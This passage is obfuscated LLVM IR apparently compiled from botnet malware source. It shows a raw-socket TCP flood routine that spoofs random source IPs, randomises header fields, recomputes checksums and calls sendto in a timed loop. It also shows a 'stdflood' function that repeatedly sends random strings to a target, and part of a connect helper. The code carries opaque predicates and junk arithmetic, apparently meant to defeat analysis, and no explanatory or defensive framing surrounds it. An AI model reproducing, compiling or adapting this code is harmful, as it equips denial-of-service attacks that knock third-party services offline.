  %355 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %354, i32 0, i32 4
  %356 = load i16, i16* %355, align 4
  %357 = and i16 %356, -2049
  %358 = or i16 %357, 2048
  store i16 %358, i16* %355, align 4
  br label %362

; <label>:359:                                    ; preds = %347
  %360 = load i8*, i8** %21, align 8
  %361 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.49, i32 0, i32 0), i8* %360)
  br label %362

; <label>:362:                                    ; preds = %359, %351
  %363 = load i32, i32* @x.23
  %364 = load i32, i32* @y.24
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %362
  %371 = load i32, i32* @x.23
  %372 = load i32, i32* @y.24
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %379

; <label>:379:                                    ; preds = %originalBBpart2109, %originalBBpart2105
  br label %380

; <label>:380:                                    ; preds = %379, %311
  br label %381

; <label>:381:                                    ; preds = %380, %originalBBpart281
  br label %382

; <label>:382:                                    ; preds = %381, %originalBBpart259
  %383 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #6
  store i8* %383, i8** %21, align 8
  br label %216

; <label>:384:                                    ; preds = %216
  br label %385

; <label>:385:                                    ; preds = %384, %177
  %386 = call i32 @rand_cmwc()
  %387 = trunc i32 %386 to i16
  %388 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 0
  %390 = bitcast %union.anon* %389 to %struct.anon.0*
  %391 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %390, i32 0, i32 5
  store i16 %387, i16* %391, align 2
  %392 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 0
  %394 = bitcast %union.anon* %393 to %struct.anon.0*
  %395 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %394, i32 0, i32 6
  store i16 0, i16* %395, align 4
  %396 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon* %397 to %struct.anon.0*
  %399 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %398, i32 0, i32 7
  store i16 0, i16* %399, align 2
  %400 = load i32, i32* %7, align 4
  %401 = icmp eq i32 %400, 0
  br i1 %401, label %402, label %404

; <label>:402:                                    ; preds = %385
  %403 = call i32 @rand_cmwc()
  br label %409

; <label>:404:                                    ; preds = %385
  %405 = load i32, i32* %7, align 4
  %406 = trunc i32 %405 to i16
  %407 = call zeroext i16 @htons(i16 zeroext %406) #9
  %408 = zext i16 %407 to i32
  br label %409

; <label>:409:                                    ; preds = %404, %402
  %410 = phi i32 [ %403, %402 ], [ %408, %404 ]
  %411 = trunc i32 %410 to i16
  %412 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon* %413 to %struct.anon.0*
  %415 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %414, i32 0, i32 1
  store i16 %411, i16* %415, align 2
  %416 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %417 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %418 = call zeroext i16 @tcpcsum(%struct.iphdr* %416, %struct.tcphdr* %417)
  %419 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  %421 = bitcast %union.anon* %420 to %struct.anon.0*
  %422 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %421, i32 0, i32 6
  store i16 %418, i16* %422, align 4
  %423 = bitcast i8* %135 to i16*
  %424 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 2
  %426 = load i16, i16* %425, align 2
  %427 = zext i16 %426 to i32
  %428 = call zeroext i16 @csum(i16* %423, i32 %427)
  %429 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 7
  store i16 %428, i16* %430, align 2
  %431 = call i64 @time(i64* null) #6
  %432 = load i32, i32* %8, align 4
  %433 = sext i32 %432 to i64
  %434 = add nsw i64 %431, %433
  %435 = trunc i64 %434 to i32
  store i32 %435, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %436

; <label>:436:                                    ; preds = %506, %505, %409
  br label %437

; <label>:437:                                    ; preds = %436
  %438 = load i32, i32* @x.23
  %439 = load i32, i32* @y.24
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %437
  %446 = load i32, i32* %15, align 4
  %447 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %448 = call i64 @sendto(i32 %446, i8* %135, i64 %133, i32 0, %struct.sockaddr* %447, i32 16)
  %449 = load i32, i32* %17, align 4
  %450 = call i32 @getRandomIP(i32 %449)
  %451 = call i32 @htonl(i32 %450) #9
  %452 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 8
  store i32 %451, i32* %453, align 4
  %454 = call i32 @rand_cmwc()
  %455 = trunc i32 %454 to i16
  %456 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 3
  store i16 %455, i16* %457, align 4
  %458 = call i32 @rand_cmwc()
  %459 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 0
  %461 = bitcast %union.anon* %460 to %struct.anon.0*
  %462 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %461, i32 0, i32 2
  store i32 %458, i32* %462, align 4
  %463 = call i32 @rand_cmwc()
  %464 = trunc i32 %463 to i16
  %465 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %466 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %465, i32 0, i32 0
  %467 = bitcast %union.anon* %466 to %struct.anon.0*
  %468 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %467, i32 0, i32 0
  store i16 %464, i16* %468, align 4
  %469 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 0
  %471 = bitcast %union.anon* %470 to %struct.anon.0*
  %472 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %471, i32 0, i32 6
  store i16 0, i16* %472, align 4
  %473 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %474 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %475 = call zeroext i16 @tcpcsum(%struct.iphdr* %473, %struct.tcphdr* %474)
  %476 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 0
  %478 = bitcast %union.anon* %477 to %struct.anon.0*
  %479 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %478, i32 0, i32 6
  store i16 %475, i16* %479, align 4
  %480 = bitcast i8* %135 to i16*
  %481 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 2
  %483 = load i16, i16* %482, align 2
  %484 = zext i16 %483 to i32
  %485 = call zeroext i16 @csum(i16* %480, i32 %484)
  %486 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 7
  store i16 %485, i16* %487, align 2
  %488 = load i32, i32* %23, align 4
  %489 = load i32, i32* %13, align 4
  %490 = icmp eq i32 %488, %489
  %491 = load i32, i32* @x.23
  %492 = load i32, i32* @y.24
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br i1 %490, label %499, label %506

; <label>:499:                                    ; preds = %originalBBpart2113
  %500 = call i64 @time(i64* null) #6
  %501 = load i32, i32* %22, align 4
  %502 = sext i32 %501 to i64
  %503 = icmp sgt i64 %500, %502
  br i1 %503, label %504, label %505

; <label>:504:                                    ; preds = %499
  br label %509

; <label>:505:                                    ; preds = %499
  store i32 0, i32* %23, align 4
  br label %436

; <label>:506:                                    ; preds = %originalBBpart2113
  %507 = load i32, i32* %23, align 4
  %508 = add i32 %507, 1
  store i32 %508, i32* %23, align 4
  br label %436

; <label>:509:                                    ; preds = %504
  %510 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %510)
  br label %511

; <label>:511:                                    ; preds = %509, %103, %81, %74
  %512 = load i32, i32* @x.23
  %513 = load i32, i32* @y.24
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %511
  %520 = load i32, i32* @x.23
  %521 = load i32, i32* @y.24
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %28
  %528 = call i32 @rand_cmwc()
  %529 = trunc i32 %528 to i16
  %530 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %529, i16* %530, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %48
  %531 = load i32, i32* %7, align 4
  %532 = trunc i32 %531 to i16
  %533 = call zeroext i16 @htons(i16 zeroext %532) #9
  %534 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %533, i16* %534, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %82
  store i32 1, i32* %16, align 4
  %535 = load i32, i32* %15, align 4
  %536 = bitcast i32* %16 to i8*
  %537 = call i32 @setsockopt(i32 %535, i32 0, i32 3, i8* %536, i32 4) #6
  %538 = icmp slt i32 %537, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  %539 = load i32, i32* %11, align 4
  %_ = sub i32 32, %539
  %gen = mul i32 %_, %539
  %540 = sub nsw i32 32, %539
  %_11 = sub i32 0, 1
  %gen12 = add i32 %_11, %540
  %_13 = sub i32 1, %540
  %gen14 = mul i32 %_13, %540
  %_15 = sub i32 0, 1
  %gen16 = add i32 %_15, %540
  %_17 = sub i32 0, 1
  %gen18 = add i32 %_17, %540
  %541 = shl i32 1, %540
  %_19 = sub i32 0, %541
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 0, %541
  %gen22 = add i32 %_21, 1
  %_23 = shl i32 %541, 1
  %_24 = sub i32 %541, 1
  %gen25 = mul i32 %_24, 1
  %_26 = shl i32 %541, 1
  %542 = sub nsw i32 %541, 1
  %_27 = sub i32 0, %542
  %gen28 = add i32 %_27, -1
  %_29 = shl i32 %542, -1
  %_30 = sub i32 %542, -1
  %gen31 = mul i32 %_30, -1
  %_32 = shl i32 %542, -1
  %_33 = shl i32 %542, -1
  %_34 = shl i32 %542, -1
  %543 = xor i32 %542, -1
  store i32 %543, i32* %17, align 4
  br label %originalBB10

originalBB38alteredBB:                            ; preds = %originalBB38, %219
  %544 = load i8*, i8** %21, align 8
  %545 = call i32 @strcmp(i8* %544, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %546 = icmp ne i32 %545, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %239
  %547 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 0
  %549 = bitcast %union.anon* %548 to %struct.anon.0*
  %550 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %549, i32 0, i32 4
  %551 = load i16, i16* %550, align 4
  %_43 = sub i16 0, %551
  %gen44 = add i16 %_43, -513
  %_45 = sub i16 0, %551
  %gen46 = add i16 %_45, -513
  %_47 = shl i16 %551, -513
  %552 = and i16 %551, -513
  %_48 = shl i16 %552, 512
  %_49 = sub i16 0, %552
  %gen50 = add i16 %_49, 512
  %_51 = shl i16 %552, 512
  %_52 = shl i16 %552, 512
  %_53 = shl i16 %552, 512
  %_54 = shl i16 %552, 512
  %_55 = sub i16 %552, 512
  %gen56 = mul i16 %_55, 512
  %_57 = shl i16 %552, 512
  %553 = or i16 %552, 512
  store i16 %553, i16* %550, align 4
  br label %originalBB42

originalBB61alteredBB:                            ; preds = %originalBB61, %263
  %554 = load i8*, i8** %21, align 8
  %555 = call i32 @strcmp(i8* %554, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %556 = icmp ne i32 %555, 0
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %283
  %557 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %558 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %557, i32 0, i32 0
  %559 = bitcast %union.anon* %558 to %struct.anon.0*
  %560 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %559, i32 0, i32 4
  %561 = load i16, i16* %560, align 4
  %_66 = shl i16 %561, -1025
  %_67 = sub i16 0, %561
  %gen68 = add i16 %_67, -1025
  %562 = and i16 %561, -1025
  %_69 = sub i16 %562, 1024
  %gen70 = mul i16 %_69, 1024
  %_71 = shl i16 %562, 1024
  %_72 = shl i16 %562, 1024
  %_73 = sub i16 0, %562
  %gen74 = add i16 %_73, 1024
  %_75 = shl i16 %562, 1024
  %_76 = shl i16 %562, 1024
  %_77 = shl i16 %562, 1024
  %_78 = sub i16 %562, 1024
  %gen79 = mul i16 %_78, 1024
  %563 = or i16 %562, 1024
  store i16 %563, i16* %560, align 4
  br label %originalBB65

originalBB83alteredBB:                            ; preds = %originalBB83, %323
  %564 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 0
  %566 = bitcast %union.anon* %565 to %struct.anon.0*
  %567 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %566, i32 0, i32 4
  %568 = load i16, i16* %567, align 4
  %_84 = sub i16 0, %568
  %gen85 = add i16 %_84, -4097
  %_86 = sub i16 0, %568
  %gen87 = add i16 %_86, -4097
  %_88 = sub i16 %568, -4097
  %gen89 = mul i16 %_88, -4097
  %_90 = sub i16 %568, -4097
  %gen91 = mul i16 %_90, -4097
  %_92 = shl i16 %568, -4097
  %_93 = shl i16 %568, -4097
  %_94 = sub i16 0, %568
  %gen95 = add i16 %_94, -4097
  %569 = and i16 %568, -4097
  %_96 = sub i16 %569, 4096
  %gen97 = mul i16 %_96, 4096
  %_98 = sub i16 %569, 4096
  %gen99 = mul i16 %_98, 4096
  %_100 = sub i16 0, %569
  %gen101 = add i16 %_100, 4096
  %_102 = sub i16 0, %569
  %gen103 = add i16 %_102, 4096
  %570 = or i16 %569, 4096
  store i16 %570, i16* %567, align 4
  br label %originalBB83

originalBB107alteredBB:                           ; preds = %originalBB107, %362
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %437
  %571 = load i32, i32* %15, align 4
  %572 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %573 = call i64 @sendto(i32 %571, i8* %135, i64 %133, i32 0, %struct.sockaddr* %572, i32 16)
  %574 = load i32, i32* %17, align 4
  %575 = call i32 @getRandomIP(i32 %574)
  %576 = call i32 @htonl(i32 %575) #9
  %577 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %578 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %577, i32 0, i32 8
  store i32 %576, i32* %578, align 4
  %579 = call i32 @rand_cmwc()
  %580 = trunc i32 %579 to i16
  %581 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %582 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %581, i32 0, i32 3
  store i16 %580, i16* %582, align 4
  %583 = call i32 @rand_cmwc()
  %584 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %585 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %584, i32 0, i32 0
  %586 = bitcast %union.anon* %585 to %struct.anon.0*
  %587 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %586, i32 0, i32 2
  store i32 %583, i32* %587, align 4
  %588 = call i32 @rand_cmwc()
  %589 = trunc i32 %588 to i16
  %590 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %591 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %590, i32 0, i32 0
  %592 = bitcast %union.anon* %591 to %struct.anon.0*
  %593 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %592, i32 0, i32 0
  store i16 %589, i16* %593, align 4
  %594 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %595 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %594, i32 0, i32 0
  %596 = bitcast %union.anon* %595 to %struct.anon.0*
  %597 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %596, i32 0, i32 6
  store i16 0, i16* %597, align 4
  %598 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %599 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %600 = call zeroext i16 @tcpcsum(%struct.iphdr* %598, %struct.tcphdr* %599)
  %601 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %602 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %601, i32 0, i32 0
  %603 = bitcast %union.anon* %602 to %struct.anon.0*
  %604 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %603, i32 0, i32 6
  store i16 %600, i16* %604, align 4
  %605 = bitcast i8* %135 to i16*
  %606 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %607 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %606, i32 0, i32 2
  %608 = load i16, i16* %607, align 2
  %609 = zext i16 %608 to i32
  %610 = call zeroext i16 @csum(i16* %605, i32 %609)
  %611 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %612 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %611, i32 0, i32 7
  store i16 %610, i16* %612, align 2
  %613 = load i32, i32* %23, align 4
  %614 = load i32, i32* %13, align 4
  %615 = icmp eq i32 %613, %614
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %511
  br label %originalBB115
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

declare i32 @printf(i8*, ...) #5

; Function Attrs: noinline nounwind uwtable
define void @stdflood(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %15, i32* %9, align 4
  %16 = call i64 @time(i64* null) #6
  store i64 %16, i64* %10, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %12, align 8
  %19 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %12, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %12, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #6
  %31 = load %struct.hostent*, %struct.hostent** %12, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %6, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %13, align 4
  br label %39

; <label>:39:                                     ; preds = %78, %4
  %40 = load i32, i32* %13, align 4
  %41 = icmp uge i32 %40, 50
  br i1 %41, label %42, label %78

; <label>:42:                                     ; preds = %39
  %43 = load i32, i32* @x.25
  %44 = load i32, i32* @y.26
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = call i8* @makestring()
  store i8* %51, i8** %14, align 8
  %52 = load i32, i32* %9, align 4
  %53 = load i8*, i8** %14, align 8
  %54 = load i32, i32* %8, align 4
  %55 = sext i32 %54 to i64
  %56 = call i64 @send(i32 %52, i8* %53, i64 %55, i32 0)
  %57 = load i32, i32* %9, align 4
  %58 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %59 = call i32 @connect(i32 %57, %struct.sockaddr* %58, i32 16)
  %60 = call i64 @time(i64* null) #6
  %61 = load i64, i64* %10, align 8
  %62 = load i32, i32* %7, align 4
  %63 = sext i32 %62 to i64
  %64 = add nsw i64 %61, %63
  %65 = icmp sge i64 %60, %64
  %66 = load i32, i32* @x.25
  %67 = load i32, i32* @y.26
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %65, label %74, label %77

; <label>:74:                                     ; preds = %originalBBpart2
  %75 = load i32, i32* %9, align 4
  %76 = call i32 @close(i32 %75)
  call void @_exit(i32 0) #11
  unreachable

; <label>:77:                                     ; preds = %originalBBpart2
  store i32 0, i32* %13, align 4
  br label %78

; <label>:78:                                     ; preds = %77, %39
  %79 = load i32, i32* %13, align 4
  %80 = add i32 %79, 1
  store i32 %80, i32* %13, align 4
  br label %39
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %42
  %82 = call i8* @makestring()
  store i8* %82, i8** %14, align 8
  %83 = load i32, i32* %9, align 4
  %84 = load i8*, i8** %14, align 8
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %87 = call i64 @send(i32 %83, i8* %84, i64 %86, i32 0)
  %88 = load i32, i32* %9, align 4
  %89 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %90 = call i32 @connect(i32 %88, %struct.sockaddr* %89, i32 16)
  %91 = call i64 @time(i64* null) #6
  %92 = load i64, i64* %10, align 8
  %93 = load i32, i32* %7, align 4
  %94 = sext i32 %93 to i64
  %_ = sub i64 0, %92
  %gen = add i64 %_, %94
  %_1 = shl i64 %92, %94
  %_2 = sub i64 %92, %94
  %gen3 = mul i64 %_2, %94
  %_4 = sub i64 0, %92
  %gen5 = add i64 %_4, %94
  %_6 = sub i64 %92, %94
  %gen7 = mul i64 %_6, %94
  %_8 = shl i64 %92, %94
  %_9 = sub i64 %92, %94
  %gen10 = mul i64 %_9, %94
  %_11 = sub i64 %92, %94
  %gen12 = mul i64 %_11, %94
  %_13 = sub i64 0, %92
  %gen14 = add i64 %_13, %94
  %95 = add nsw i64 %92, %94
  %96 = icmp sge i64 %91, %95
  br label %originalBB
}

declare %struct.hostent* @gethostbyname(i8*) #5

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #2

declare i64 @send(i32, i8*, i64, i32) #5

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i32 @close(i32) #5

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i32 0, i32 0)) #6
  call void @exit(i32 1) #12
  unreachable

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.27
  %15 = load i32, i32* @y.28
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = load %struct.hostent*, %struct.hostent** %5, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 4
  %24 = load i8**, i8*** %23, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %28 = bitcast %struct.in_addr* %27 to i8*
  %29 = load %struct.hostent*, %struct.hostent** %5, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 3
  %31 = load i32, i32* %30, align 4
  %32 = sext i32 %31 to i64
  call void @bcopy(i8* %26, i8* %28, i64 %32) #6
  %33 = load i16, i16* %4, align 2
  %34 = call zeroext i16 @htons(i16 zeroext %33) #9
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = call i32 @socket(i32 2, i32 1, i32 6) #6
  store i32 %37, i32* %8, align 4
  %38 = load i32, i32* %8, align 4
  %39 = bitcast i32* %7 to i8*
  %40 = call i32 @setsockopt(i32 %38, i32 6, i32 1, i8* %39, i32 4) #6
  %41 = load i32, i32* %8, align 4
  %42 = icmp eq i32 %41, -1
  %43 = load i32, i32* @x.27
  %44 = load i32, i32* @y.28
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %42, label %51, label %52

; <label>:51:                                     ; preds = %originalBBpart2
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i32 0, i32 0))
  call void @exit(i32 1) #12
  unreachable

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* %8, align 4
  %54 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %55 = call i32 @connect(i32 %53, %struct.sockaddr* %54, i32 16)
